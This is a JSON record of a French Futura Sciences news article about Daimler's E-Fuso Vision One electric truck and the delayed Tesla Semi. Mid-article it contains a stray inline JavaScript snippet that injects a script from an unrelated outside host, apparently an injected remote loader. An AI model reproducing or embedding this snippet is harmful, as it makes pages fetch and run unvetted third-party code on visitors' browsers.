{"title": "Tesla battu par Daimler : le premier poids lourd électrique s'appelle E-Fuso Vision One", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "27/10/2017", "content": "Présenté au salon de Tokyo, le camion E-Fuso Vision One, de Daimler, est le premier poids lourd électrique. Il offre une autonomie de 350 km et peut emporter onze tonnes de charge utile, soit seulement deux de moins que son équivalent à moteur Diesel. Daimler Trucks et sa filiale Mitsubishi Fuso Truck and Bus Corporation ont profité du salon  automobile  Tokyo Motor Show pour dévoiler le premier  camion poids lourd  électrique. Baptisé E-Fuso Vision One, il  est une évolution du concept présenté en 2016 sous le nom d' Urban eTruck , un mastodonte de 26 tonnes qui affichait une autonomie de 200 kilomètres. Pour sa part, le  E-Fuso Vision One  améliore sensiblement ces chiffres avec un poids à vide de 23 tonnes et une autonomie maximale de 350 kilomètres grâce à un ensemble de batteries fournissant jusqu'à 300 kWh. Ce camion électrique pourra transporter 11 tonnes de charge utile ce qui, souligne Daimler, ne représente que deux tonnes de moins qu'un camion de gabarit équivalent à  moteur Diesel .   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pas sur le marché avant quatre ans Dans son communiqué, le constructeur souligne que la conception de  camions électriques  pour le transport long courrier va demander encore un  « temps considérable »  et que ce modèle se destine plutôt à des trajets régionaux intra-urbains. Pour autant, Daimler estime qu'une commercialisation d'un modèle de série du E-Fuso Vision One n'interviendra pas avant quatre ans sur des  « marchés mûrs » , comme l'Europe et le Japon, qui seront capables de fournir les infrastructures de charge rapide nécessaires au développement des transports électriques.  Daimler a en tout cas un coup d'avance sur  Tesla  qui devait initialement présenter son poids lourd électrique le 26 octobre. Mais dans un message posté sur  Twitter , Elon Musk a annoncé que la présentation du  Tesla  Semi était reportée au 26 novembre afin de laisser le temps à l'entreprise de gérer ses problèmes de production de la  Model 3  et de fournir une aide matérielle aux sinistrés de l'ile de  Porto Rico  après le passage de l' ouragan  Maria. D'après les rumeurs qui circulent, le camion électrique Tesla aurait une autonomie qui pourrait aller jusqu'à 480 kilomètres. NIO EP9 : la supercar électrique la plus rapide du monde                       Avec une puissance de plus de 1.300 chevaux et une vitesse de pointe de 313 km/h, la NIO EP9 revendique le titre de supercar électrique la plus rapide du monde. Elle a récemment battu un record sur un tour du célèbre circuit du Nürburgring, en Allemagne, et sur le Paul Ricard en France.                                       ", "theme": "tech"}